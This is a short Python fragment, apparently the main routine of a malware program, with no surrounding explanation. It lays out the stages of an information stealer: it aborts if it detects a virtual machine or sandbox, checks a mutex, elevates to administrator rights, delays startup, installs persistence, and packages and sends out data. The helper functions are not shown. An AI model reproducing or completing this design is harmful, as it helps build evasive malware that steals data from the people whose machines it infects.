def main():
    if check_vm() or check_sandbox():
        return
    
    check_mutex()
    
    elevate_admin()
    
    startup_delay()
    
    add_persistence()
    
    package_and_send_data()

if __name__ == "__main__":
    main()
